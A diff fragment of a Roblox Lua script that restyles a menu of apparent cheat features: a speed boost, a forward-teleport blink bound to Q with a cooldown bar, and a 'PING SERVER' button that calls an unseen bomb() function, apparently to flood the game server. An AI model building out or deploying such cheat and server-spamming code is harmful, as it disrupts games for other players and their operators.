-cooldownFill.BackgroundColor3 = Color3.fromRGB(0, 255, 150)
+cooldownFill.BackgroundColor3 = C.coolGreen
 cooldownFill.BorderSizePixel = 0
 
 local cooldownFillCorner = Instance.new("UICorner", cooldownFill)
@@ -355,7 +685,7 @@ local cooldownText = Instance.new("TextLabel", cooldownBg)
 cooldownText.Size = UDim2.new(1, 0, 1, 0)
 cooldownText.BackgroundTransparency = 1
 cooldownText.Text = "100%"
-cooldownText.TextColor3 = Color3.fromRGB(255, 255, 255)
+cooldownText.TextColor3 = C.white
 cooldownText.TextSize = 9
 cooldownText.Font = Enum.Font.GothamBold
 cooldownText.ZIndex = 2
@@ -391,23 +721,16 @@ end)
 
 -- Button actions
 pingBtn.MouseButton1Click:Connect(function()
-    local power = powerSlider.getValue()
     pingBtn.Text = "PINGING..."
-    
     local n = bomb()
-    
     pingBtn.Text = "PINGED: " .. n
-    
-    task.delay(2, function()
-        pingBtn.Text = "PING SERVER"
-    end)
+    task.delay(2, function() pingBtn.Text = "PING SERVER" end)
 end)
 
 local speedActive = false
 boostBtn.MouseButton1Click:Connect(function()
     speedActive = not speedActive
     local speed = speedSlider.getValue()
-    
     if speedActive then
         boostBtn.Text = "BOOST: ON"
         if plr.Character and plr.Character:FindFirstChild("Humanoid") then
@@ -421,33 +744,24 @@ boostBtn.MouseButton1Click:Connect(function()
     end
 end)
 
--- Flash TP
 local flashEnabled = false
 local flashCooldown = false
-local cooldownTime = 3 -- 3 seconds cooldown
+local cooldownTime = 3
 
 flashBtn.MouseButton1Click:Connect(function()
     flashEnabled = not flashEnabled
-    if flashEnabled then
-        flashBtn.Text = "FLASH TP: ON"
-    else
-        flashBtn.Text = "FLASH TP: OFF"
-    end
+    flashBtn.Text = flashEnabled and "FLASH TP: ON" or "FLASH TP: OFF"
 end)
 
 UIS.InputBegan:Connect(function(input, gameProcessed)
     if gameProcessed then return end
-    
     if input.KeyCode == Enum.KeyCode.Q and flashEnabled and not flashCooldown then
         if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
             local hrp = plr.Character.HumanoidRootPart
-            
-            -- Calculate blink distance (20 studs forward)
             local blinkDistance = 20
             local lookVector = hrp.CFrame.LookVector
             local targetPos = hrp.Position + (lookVector * blinkDistance)
-            
-            -- Create blink effect at start
+
             local blinkPart = Instance.new("Part")
             blinkPart.Anchored = true
             blinkPart.CanCollide = false
@@ -455,17 +769,15 @@ UIS.InputBegan:Connect(function(input, gameProcessed)
             blinkPart.Position = hrp.Position
             blinkPart.Transparency = 0.5
             blinkPart.Material = Enum.Material.Neon
-            blinkPart.Color = Color3.fromRGB(255, 50, 50)
+            blinkPart.Color = C.borderGlow
             blinkPart.Parent = workspace
-            
+
             local blinkPart2 = blinkPart:Clone()
             blinkPart2.Position = targetPos
             blinkPart2.Parent = workspace
-            
-            -- Teleport forward
+
             hrp.CFrame = CFrame.new(targetPos, targetPos + lookVector)
-            
-            -- Fade out effect
+
             task.spawn(function()
                 for i = 1, 10 do
                     blinkPart.Transparency = blinkPart.Transparency + 0.05
@@ -477,35 +789,28 @@ UIS.InputBegan:Connect(function(input, gameProcessed)
                 blinkPart:Destroy()
                 blinkPart2:Destroy()
             end)
-            
-            -- Start cooldown
+
             flashCooldown = true
             local startTime = tick()
-            
+
             task.spawn(function()
                 while tick() - startTime < cooldownTime do
                     local elapsed = tick() - startTime
                     local progress = elapsed / cooldownTime
                     local percentage = math.floor(progress * 100)
-                    
                     cooldownFill.Size = UDim2.new(progress, 0, 1, 0)
                     cooldownText.Text = percentage .. "%"
-                    
-                    -- Change color based on progress
                     if progress < 0.5 then
-                        cooldownFill.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
+                        cooldownFill.BackgroundColor3 = Color3.fromRGB(50, 100, 255)
                     elseif progress < 0.8 then
-                        cooldownFill.BackgroundColor3 = Color3.fromRGB(255, 165, 0)
+                        cooldownFill.BackgroundColor3 = C.barFill
                     else
-                        cooldownFill.BackgroundColor3 = Color3.fromRGB(0, 255, 150)
+                        cooldownFill.BackgroundColor3 = C.coolGreen
                     end
-                    
                     task.wait(0.05)
                 end
-                
-                -- Reset to 100%
                 cooldownFill.Size = UDim2.new(1, 0, 1, 0)
-                cooldownFill.BackgroundColor3 = Color3.fromRGB(0, 255, 150)
+                cooldownFill.BackgroundColor3 = C.coolGreen
                 cooldownText.Text = "100%"
                 flashCooldown = false
             end)
